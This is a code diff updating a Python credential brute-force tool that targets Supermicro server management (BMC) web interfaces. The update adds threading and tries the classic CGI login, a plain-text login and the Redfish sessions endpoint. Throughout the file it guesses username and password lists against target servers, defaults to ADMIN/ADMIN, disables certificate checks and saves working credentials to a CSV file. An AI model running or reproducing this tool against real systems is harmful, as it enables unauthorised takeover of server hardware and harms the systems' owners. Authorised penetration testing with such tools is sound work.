@@ -1,12 +1,13 @@
 #! /usr/bin/env python3
 
 import requests, warnings
-from base64 import b64encode
 from datetime import date
+from base64 import b64encode
+from queue import Queue, Empty
 from urllib.parse import quote
-from optparse import OptionParser
+from argparse import ArgumentParser
+from threading import Thread, Lock
 from colorama import Fore, Back, Style
-from multiprocessing import Lock, Pool, cpu_count
 from time import strftime, localtime, time
 
 status_color = {
@@ -17,84 +18,94 @@ status_color = {
     ' ': Fore.WHITE
 }
 
-scheme = "http"
+scheme = "https"
 login_endpoint = "/cgi/login.cgi"
+redfish_login_endpoint = "/redfish/v1/SessionService/Sessions"
 lock = Lock()
-process_count = cpu_count()
+thread_count = 20
+successful_logins = {}
 warnings.filterwarnings('ignore')
 
 def display(status, data, start='', end='\n'):
     print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)
 
-def get_arguments(*args):
-    parser = OptionParser()
-    for arg in args:
-        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
-    return parser.parse_args()[0]
+def get_arguments():
+    description = "SuperMicro Web Interface Brute Force"
+    parser = ArgumentParser(description=description)
+    parser.add_argument('-s', "--server", type=str, help="Target Supermicro Server (seperated by ',' or File Name)", required=True)
+    parser.add_argument('-u', "--users", type=str, help="Target Users (seperated by ',') or File containing List of Users")
+    parser.add_argument('-P', "--password", type=str, help="Passwords (seperated by ',') or File containing List of Passwords")
+    parser.add_argument('-c', "--credentials", type=str, help="Name of File containing Credentials in format ({user}:{password})")
+    parser.add_argument('-S', "--scheme", type=str, help="Scheme to use", default=scheme)
+    parser.add_argument('-t', "--timeout", type=int, help="Timeout for Login Request", default=None)
+    parser.add_argument('-T', "--threads", type=int, help="Brute Force Threads", default=thread_count)
+    parser.add_argument('-w', "--write", type=str, help="CSV File to Dump Successful Logins", default=f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv")
+    return parser.parse_args()
 
 def login(server, username='ADMIN', password='ADMIN', scheme="http", timeout=None):
     t1 = time()
     try:
-        response = requests.post(f"{scheme}://{server}{login_endpoint}", data=f"name={quote(b64encode(username.encode()).decode())}&pwd={quote(b64encode(password.encode()).decode())}&check=00", verify=False) if timeout == None else requests.post(f"{scheme}://{server}{login_endpoint}", data=f"name={quote(b64encode(username.encode()).decode())}&pwd={quote(b64encode(password.encode()).decode())}&check=00", verify=False, timeout=timeout)
+        response = requests.post(f"{scheme}://{server}{login_endpoint}", data=f"name={quote(b64encode(username.encode()).decode())}&pwd={quote(b64encode(password.encode()).decode())}&check=00", verify=False, timeout=timeout)
         authorization_status = True if "Set-Cookie" in response.headers.keys() else False
+        if authorization_status:
+            t2 = time()
+            return authorization_status, t2-t1
+
+        response = requests.post(f"{scheme}://{server}{login_endpoint}", data=f"name={username}&pwd={password}", verify=False, timeout=timeout)
+        authorization_status = True if "Set-Cookie" in response.headers.keys() else False
+        if authorization_status:
+            t2 = time()
+            return authorization_status, t2-t1
+
+        response = requests.post(f"{scheme}://{server}{redfish_login_endpoint}", json={"UserName": username, "Password": password}, verify=False, timeout=timeout)
+        authorization_status = True if response.status_code // 100 == 2 else False
         t2 = time()
         return authorization_status, t2-t1
     except Exception as error:
         t2 = time()
         return error, t2-t1
-def brute_force(process_index, servers, credentials, scheme="http", timeout=None):
-    successful_logins = {}
-    for credential in credentials:
-        status = ['']
-        for server in servers:
-            status = login(server, credential[0], credential[1], scheme, timeout)
-            if status[0] == True:
+def brute_force(process_index, queue, scheme="http", timeout=None):
+    while True:
+        try:
+            server, credential = queue.get_nowait()
+        except Empty:
+            break
+        status = login(server, credential[0], credential[1], scheme, timeout)
+        if status[0] == True:
+            with lock:
                 successful_logins[server] = [credential[0], credential[1]]
-                with lock:
-                    display(' ', f"Process {process_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET}")
-            elif status[0] == False:
-                with lock:
-                    display(' ', f"Process {process_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
-            else:
-                with lock:
-                    display(' ', f"Process {process_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
+                display(' ', f"Process {process_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET}")
+        elif status[0] == False:
+            with lock:
+                display(' ', f"Process {process_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
+        else:
+            with lock:
+                display(' ', f"Process {process_index+1}:{status[1]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET}@{Back.MAGENTA}{server}{Back.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
+        queue.task_done()
     return successful_logins
-def main(servers, credentials, scheme="http", timeout=None):
-    successful_logins = {}
-    pool = Pool(process_count)
-    display('+', f"Starting {Back.MAGENTA}{process_count} Brute Force Processs{Back.RESET}")
-    processs = []
-    total_servers = len(servers)
-    server_divisions = [servers[group*total_servers//process_count: (group+1)*total_servers//process_count] for group in range(process_count)]
-    for index, server_division in enumerate(server_divisions):
-        processs.append(pool.apply_async(brute_force, (index, server_division, credentials, scheme, timeout)))
-    for process in processs:
-        successful_logins.update(process.get())
-    pool.close()
-    pool.join()
+def main(servers, credentials, scheme="http", timeout=None, thread_count=thread_count):
+    queue = Queue()
+    for credential in credentials:
+        for server in servers:
+            queue.put((server, credential))
+    threads = []
+    for index in range(thread_count):
+        threads.append(Thread(target=brute_force, args=(index, queue, scheme, timeout)))
+        threads[-1].start()
+    for thread in threads:
+        thread.join()
     display('+', f"Processs Finished Excuting")
-    return successful_logins
 
 if __name__ == "__main__":
-    arguments = get_arguments(('-s', "--server", "server", "Target Supermicro Server (seperated by ',' or File Name)"),
-                              ('-u', "--users", "users", "Target Users (seperated by ',') or File containing List of Users"),
-                              ('-P', "--password", "password", "Passwords (seperated by ',') or File containing List of Passwords"),
-                              ('-c', "--credentials", "credentials", "Name of File containing Credentials in format ({user}:{password})"),
-                              ('-S', "--scheme", "scheme", f"Scheme to use (Default={scheme})"),
-                              ('-t', "--timeout", "timeout", "Timeout for Login Request"),
-                              ('-w', "--write", "write", "CSV File to Dump Successful Logins (default=current data and time)"))
-    if not arguments.server:
-        display('-', f"Please specify {Back.YELLOW}Target Servers{Back.RESET}")
+    arguments = get_arguments()
+    try:
+        with open(arguments.server, 'r') as file:
+            arguments.server = [server for server in file.read().split('\n') if server != '']
+    except FileNotFoundError:
+        arguments.server = arguments.server.split(',')
+    except Exception as error:
+        display('-', f"Error Occured while reading File {Back.MAGENTA}{arguments.server}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
         exit(0)
-    else:
-        try:
-            with open(arguments.server, 'r') as file:
-                arguments.server = [server for server in file.read().split('\n') if server != '']
-        except FileNotFoundError:
-            arguments.server = arguments.server.split(',')
-        except Exception as error:
-            display('-', f"Error Occured while reading File {Back.MAGENTA}{arguments.server}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
-            exit(0)
     if not arguments.credentials:
         if not arguments.users:
             display('*', f"No {Back.MAGENTA}USER{Back.RESET} Specified")
@@ -132,20 +143,16 @@ if __name__ == "__main__":
         except:
             display('-', f"Error while Reading File {Back.YELLOW}{arguments.credentials}{Back.RESET}")
             exit(0)
-    arguments.scheme = arguments.scheme if arguments.scheme else scheme
-    arguments.timeout = float(arguments.timeout) if arguments.timeout else None
-    if not arguments.write:
-        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
     display('+', f"Total Servers     = {Back.MAGENTA}{len(arguments.server)}{Back.RESET}")
     display('+', f"Total Credentials = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
     t1 = time()
-    successful_logins = main(arguments.server, arguments.credentials, arguments.scheme, arguments.timeout)
+    main(arguments.server, arguments.credentials, arguments.scheme, arguments.timeout, arguments.threads)
     t2 = time()
     display(':', f"Successful Logins = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
     display(':', f"Time Taken        = {Back.MAGENTA}{t2-t1:.2f} seconds{Back.RESET}")
-    display(':', f"Rate              = {Back.MAGENTA}{len(arguments.credentials)/(t2-t1):.2f} logins / seconds{Back.RESET}")
-    display(':', f"Dumping Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
-    with open(arguments.write, 'w') as file:
-        file.write(f"Server,User,Password\n")
-        file.write('\n'.join([f"{server},{user},{password}" for server, (user, password) in successful_logins.items()]))
-    display('+', f"Dumped Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}") 
+    display(':', f"Rate              = {Back.MAGENTA}{len(arguments.server) * len(arguments.credentials)/(t2-t1):.2f} logins / seconds{Back.RESET}")
+    if len(successful_logins) > 0:
+        with open(arguments.write, 'w') as file:
+            file.write(f"Server,User,Password\n")
+            file.write('\n'.join([f"{server},{user},{password}" for server, (user, password) in successful_logins.items()]))
+        display('+', f"Dumped Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
